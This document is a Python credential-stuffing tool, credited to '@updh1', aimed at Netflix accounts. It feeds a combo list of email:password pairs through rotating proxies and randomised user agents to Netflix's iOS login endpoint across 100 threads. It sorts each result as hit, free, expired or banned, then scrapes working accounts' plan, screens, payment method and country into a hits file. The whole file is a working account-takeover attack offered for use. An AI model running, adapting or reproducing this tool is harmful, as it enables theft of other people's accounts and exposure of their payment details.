import requests  
import threading  
import queue  
import sys  
import json  
from user_agent import generate_user_agent  
from colorama import Fore, init  
  
init(autoreset=True)  
ascii_art = """ 
█    ██  ██▓███  ▓█████▄  ██░ ██ 
 ██  ▓██▒▓██░  ██▒▒██▀ ██▌▓██░ ██▒
▓██  ▒██░▓██░ ██▓▒░██   █▌▒██▀▀██░
▓▓█  ░██░▒██▄█▓▒ ▒░▓█▄   ▌░▓█ ░██ 
▒▒█████▓ ▒██▒ ░  ░░▒████▓ ░▓█▒░██▓
░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░ ▒▒▓  ▒  ▒ ░░▒░▒
░░▒░ ░ ░ ░▒ ░      ░ ▒  ▒  ▒ ░▒░ ░
 ░░░ ░ ░ ░░        ░ ░  ░  ░  ░░ ░
   ░                 ░     ░  ░  ░
                   ░              
"""
for line in ascii_art.strip().split('\n'):
    print(Fore.RED + line.center(80))
print(Fore.RED + "By @updh1".center(80))
anasCombo = input(" [-] Put Combo: ").strip() 
anasProxies = input(" [-] Put Proxies File: ").strip()  
print("—"*60)
anasWorker = 100  
semaphore = threading.BoundedSemaphore(30)  
anasMaxR = 10000  
combos = queue.Queue()  
anasPrLists = []  
anasHits = 0  
anasBad = 0  
anasRetries = 0   
lock = threading.Lock()    
def files():  
    with open(anasCombo, 'r', encoding='utf-8', errors='ignore') as f:  
        for line in f:  
            line = line.strip()  
            if line and ':' in line:  
                combos.put(line)    
def anasLoadP():  
    global anasPrLists  
    with open(anasProxies, 'r', encoding='utf-8', errors='ignore') as f:  
        for line in f:  
            line = line.strip()  
            if line:  
                anasPrLists.append(line)    
def anasGetP():  
    while True:  
        for p in anasPrLists:  
            yield p  
  
anasGenP = anasGetP()    
def anasKeyPP(resp_text):  
    if ('"value":"incorrect_password"' in resp_text) or ('unrecognized_email_consumption_only' in resp_text):  
        return 'Failure'  
    if ('"value":"never_member_consumption_only"' in resp_text) or ('button_join_free_for_a_month' in resp_text):  
        return 'FREE'  
    if ('403' in resp_text) or ('"value":"throttling_failure"' in resp_text):  
        return 'Ban'  
    if 'former_member_consumption_only' in resp_text:  
        return 'EXPIRED'  
    if 'memberHome' in resp_text:  
        return 'Success'  
    return 'Unknown'    
def anasExtCookies(cookies):  
    return cookies.get('flwssn', None)  
def anasParseAP(html_text):  
    def find_between(text, start, end):  
        try:  
            return text.split(start)[1].split(end)[0]  
        except IndexError:  
            return ''    
    plan = find_between(html_text, 'localizedPlanName":{"fieldType":"String","value":"', '"}')  
    stream_quality = find_between(html_text, '},"videoQuality":{"fieldType":"String","value":"', '"}}')  
    screens = find_between(html_text, ',"maxStreams":', ',\"')  
    payment = find_between(html_text, ',"paymentMethod":{"fieldType":"String","value":"', '"},')  
    country = find_between(html_text, ',"currentCountry":"', '"')    
    return plan, stream_quality, screens, payment, country    
def checker():  
    global anasHits, anasBad, anasRetries  
    session = requests.Session()  
    while not combos.empty():  
        combo = combos.get()  
        user, passwd = combo.split(':', 1)  
        retries_for_this = 0    
        while retries_for_this < anasMaxR:  
            try:  
                semaphore.acquire()    
                proxy_raw = next(anasGenP)  
                if '@' in proxy_raw:  
                    proxy = {  
                        'http': f'http://{proxy_raw}',  
                        'https': f'http://{proxy_raw}',  
                    }  
                else:  
                    proxy = {  
                        'http': f'http://{proxy_raw}',  
                        'https': f'http://{proxy_raw}',  
                    }  
  
                headers = {  
                    "Host": "ios.prod.http1.netflix.com",  
                    "Content-Type": "application/x-www-form-urlencoded",  
                    "Accept": "*/*",  
                    "Accept-Language": "en-US;q=1",  
                    "Accept-Encoding": "gzip, deflate",  
                    "User-Agent": generate_user_agent(),  
                    "Connection": "close"  
                }  
  
                callPath = '["moneyball","appleSignUp","next"]'  
                esn = 'NFAPPL-02-IPHONE7=2-D7A76035E3B1DE2B3C63588C561D02C4E5ED1C35DD75545C10D75D9DD3A9DE94'  
  
                param_obj = {  
                    "action": "loginAction",  
                    "fields": {  
                        "email": user,  
                        "rememberMe": "false",  
                        "password": passwd  
                    },  
                    "verb": "POST",  
                    "mode": "login",  
                    "flow": "appleSignUp"  
                }  
                param_str = json.dumps(param_obj, separators=(',', ':'))    
                post_data = {  
                    "appInternalVersion": "11.0.0",  
                    "appVersion": "11.0.0",  
                    "callPath": callPath,  
                    "method": "call",  
                    "esn": esn,  
                    "param": param_str  
                }    
                response = session.post("https://ios.prod.http1.netflix.com/iosui/user/11.0",  
                                        data=post_data,  
                                        headers=headers,  
                                        proxies=proxy,  
                                        timeout=10)  
  
                keychain_result = anasKeyPP(response.text)    
                if keychain_result == 'Ban':  
                    with lock:  
                        anasRetries += 1  
                        sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries}")  
                        sys.stdout.flush()  
                    retries_for_this += 1  
                    semaphore.release()  
                    continue    
                elif keychain_result == 'Failure' or keychain_result == 'EXPIRED' or keychain_result == 'Unknown':  
                    with lock:  
                        anasBad += 1  
                        sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries}")  
                        sys.stdout.flush()  
                    semaphore.release()  
                    break    
                elif keychain_result == 'FREE':  
                    with lock:  
                        anasHits += 1  
                        with open('nf-free.txt', 'a', encoding='utf-8') as freefile:  
                            freefile.write(f"{user}:{passwd}\n")  
                        sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries} | {Fore.CYAN}Free{Fore.WHITE}")  
                        sys.stdout.flush()  
                    semaphore.release()  
                    break    
                elif keychain_result == 'Success':  
                    flwssn_cookie = anasExtCookies(response.cookies)  
                    if not flwssn_cookie:  
                        with lock:  
                            anasBad += 1  
                            sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries}")  
                            sys.stdout.flush()  
                        semaphore.release()  
                        break    
                    account_headers = {  
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "  
                                      "(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",  
                        "Pragma": "no-cache",  
                        "Accept": "*/*",  
                        "Cookie": f"flwssn={flwssn_cookie}"  
                    }    
                    try:  
                        acc_resp = session.get("https://www.netflix.com/YourAccount",  
                                               headers=account_headers,  
                                               proxies=proxy,  
                                               timeout=10)  
                    except Exception:  
                        with lock:  
                            anasRetries += 1  
                            sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries}")  
                            sys.stdout.flush()  
                        retries_for_this += 1  
                        semaphore.release()  
                        continue   
                    if 'former_member_consumption_only' in acc_resp.text:  
                        with lock:  
                            anasBad += 1  
                            sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries}")  
                            sys.stdout.flush()  
                        semaphore.release()  
                        break    
                    plan, stream_quality, screens, payment, country = anasParseAP(acc_resp.text)  
  
                    with lock:  
                        anasHits += 1  
                        sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries}")  
                        sys.stdout.flush()  
                        with open('Netflix-Hits.txt', 'a', encoding='utf-8') as hitfile:  
                            hitfile.write(f"{user}:{passwd} | Plan = {plan} | Stream Quality = {stream_quality} | Screens = {screens} | Payment = {payment} | Country = {country}\n")    
                    semaphore.release()  
                    break  
  
            except requests.exceptions.ProxyError:  
                with lock:  
                    anasRetries += 1  
                    sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries}")  
                    sys.stdout.flush()  
                retries_for_this += 1  
                semaphore.release()  
            except requests.exceptions.ConnectTimeout:  
                with lock:  
                    anasRetries += 1  
                    sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries}")  
                    sys.stdout.flush()  
                retries_for_this += 1  
                semaphore.release()  
            except requests.exceptions.ReadTimeout:  
                with lock:  
                    anasRetries += 1  
                    sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries}")  
                    sys.stdout.flush()  
                retries_for_this += 1  
                semaphore.release()  
            except Exception:  
                with lock:  
                    anasRetries += 1  
                    sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasRetries}")  
                    sys.stdout.flush()  
                retries_for_this += 1  
                semaphore.release()  
  
        combos.task_done()    
def main():  
    files()  
    anasLoadP()    
    if combos.empty():  
        print("Combo not found")  
        return  
    if not anasPrLists:  
        print("Proxies not found")  
        return   
    threads = []  
    for _ in range(anasWorker):  
        t = threading.Thread(target=checker)  
        t.daemon = True  
        t.start()  
        threads.append(t)  
  
    combos.join()    
  
if __name__ == "__main__":  
    main()